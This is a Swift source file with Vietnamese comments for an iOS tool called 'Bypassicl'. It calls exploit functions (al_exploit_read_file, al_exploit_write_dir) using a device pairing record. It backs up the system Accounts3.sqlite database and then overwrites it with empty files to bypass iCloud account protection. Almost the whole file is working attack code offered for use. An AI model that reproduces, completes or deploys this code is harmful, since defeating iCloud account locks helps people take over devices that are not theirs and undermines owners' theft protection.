import Foundation
import Combine

class AirliftService: ObservableObject {
    static let shared = AirliftService()
    
    @Published var logs: String = "=== Bypassicl Log ===\n"
    
    private let accountsDir = "/var/mobile/Library/Accounts"
    private let targetFiles = ["Accounts3.sqlite", "Accounts3.sqlite-shm", "Accounts3.sqlite-wal"]
    
    // Đường dẫn file pairing (bắt buộc)
    private var pairingPath: String?
    
    var backupDir: URL {
        let docDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        return docDir.appendingPathComponent("AccountsBackup")
    }
    
    private func log(_ message: String) {
        DispatchQueue.main.async {
            self.logs += message + "\n"
            print(message)
        }
    }
    
    // MARK: - Log callback cho AirliftFFI
    private static let logCallback: ALLogCallback = { ctx, msg in
        guard let msg = msg else { return }
        let str = String(cString: msg)
        if let service = Unmanaged<AirliftService>.fromOpaque(ctx!).takeUnretainedValue() as AirliftService? {
            service.log("[Airlift] \(str)")
        }
    }
    
    // MARK: - Kết nối / Chuẩn bị
    func connect() -> Bool {
        log("[*] Đang chuẩn bị kết nối Airlift...")
        
        // 1. Grappa token (từ GrappaHelper)
        guard let grappaToken = generateGrappaToken() else {
            log("❌ Không thể tạo Grappa Token.")
            return false
        }
        log("✅ Grappa Token OK (\(grappaToken.count) bytes)")
        
        // 2. Tìm pairing file
        guard let pairing = findPairingFile() else {
            log("❌ Không tìm thấy file pairing.")
            log("👉 Hãy copy file pairingRecord.mobiledevicepairing vào Documents của app.")
            return false
        }
        self.pairingPath = pairing
        log("✅ Pairing file: \(pairing)")
        
        log("✅ Sẵn sàng (sử dụng al_exploit_* API)")
        return true
    }
    
    private func generateGrappaToken() -> Data? {
        let maxLen = 1024
        var buffer = [UInt8](repeating: 0, count: maxLen)
        var outLen: size_t = 0
        var errBuffer = [CChar](repeating: 0, count: 256)
        
        let result = ALGetGrappaToken(1, 0, 1, &buffer, maxLen, &outLen, &errBuffer, 256)
        
        if result == 0 {
            return Data(bytes: buffer, count: outLen)
        } else {
            let errorMsg = String(cString: errBuffer)
            log("Grappa Error (\(result)): \(errorMsg)")
            return nil
        }
    }
    
    private func findPairingFile() -> String? {
        let docDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let candidates = [
            docDir.appendingPathComponent("pairingRecord.mobiledevicepairing"),
            docDir.appendingPathComponent("pairingRecord.plist"),
            docDir.appendingPathComponent("pairing.plist")
        ]
        
        for url in candidates {
            if FileManager.default.fileExists(atPath: url.path) {
                return url.path
            }
        }
        return nil
    }
    
    // MARK: - FFI: Đọc file qua exploit
    private func ffi_read_file(_ iosPath: String) -> Data? {
        guard let pairing = pairingPath else {
            log("❌ Chưa có pairing path")
            return nil
        }
        
        var outData: UnsafeMutablePointer<UInt8>? = nil
        var outLen: size_t = 0
        var outError: UnsafeMutablePointer<CChar>? = nil
        
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        let result = al_exploit_read_file(
            pairing,
            iosPath,
            AirliftService.logCallback,
            ctx,
            &outData,
            &outLen,
            &outError
        )
        
        defer {
            if let err = outError {
                al_string_free(err)
            }
            if let data = outData {
                al_bytes_free(data, outLen)
            }
        }
        
        if result != 0 {
            let errMsg = outError != nil ? String(cString: outError!) : "unknown"
            log("❌ al_exploit_read_file failed (\(result)): \(errMsg)")
            return nil
        }
        
        guard let dataPtr = outData, outLen > 0 else {
            log("❌ al_exploit_read_file returned empty data")
            return nil
        }
        
        return Data(bytes: dataPtr, count: outLen)
    }
    
    // MARK: - Ghi đè thư mục (dùng cho bypass)
    private func ffi_write_dir(sourceDir: String, targetDir: String) -> Bool {
        guard let pairing = pairingPath else { return false }
        
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        let result = al_exploit_write_dir(
            pairing,
            sourceDir,
            targetDir,
            AirliftService.logCallback,
            ctx,
            &outError
        )
        
        defer {
            if let err = outError {
                al_string_free(err)
            }
        }
        
        if result != 0 {
            let errMsg = outError != nil ? String(cString: outError!) : "unknown"
            log("❌ al_exploit_write_dir failed: \(errMsg)")
            return false
        }
        return true
    }
    
    // MARK: - Backup
    func backupAccounts() -> Bool {
        log("[*] Bắt đầu Backup Accounts...")
        
        let fm = FileManager.default
        try? fm.createDirectory(at: backupDir, withIntermediateDirectories: true)
        
        var success = true
        
        for file in targetFiles {
            let fullPath = "\(accountsDir)/\(file)"
            guard let data = ffi_read_file(fullPath) else {
                log("❌ Không đọc được \(file)")
                success = false
                continue
            }
            
            let dest = backupDir.appendingPathComponent(file)
            do {
                try data.write(to: dest)
                log("✅ Backup: \(file) (\(data.count) bytes)")
            } catch {
                log("❌ Ghi backup lỗi: \(error.localizedDescription)")
                success = false
            }
        }
        
        return success
    }
    
    // MARK: - Bypass (ghi đè bằng file rỗng)
    func bypassICloud() {
        log("[*] Bắt đầu Bypass iCloud...")
        
        guard backupAccounts() else {
            log("❌ HỦY: Backup thất bại.")
            return
        }
        
        // Tạo thư mục tạm chứa file rỗng
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("empty_accounts")
        try? FileManager.default.removeItem(at: tmpDir)
        try? FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        
        for file in targetFiles {
            let emptyFile = tmpDir.appendingPathComponent(file)
            try? Data().write(to: emptyFile) // file rỗng
        }
        
        log("[*] Đang ghi đè Accounts bằng file rỗng...")
        
        if ffi_write_dir(sourceDir: tmpDir.path, targetDir: accountsDir) {
            log("🎉 BYPASS THÀNH CÔNG (đã ghi đè Accounts).")
            log("👉 Hãy Reboot thiết bị.")
        } else {
            log("❌ Ghi đè thất bại.")
        }
        
        try? FileManager.default.removeItem(at: tmpDir)
    }
}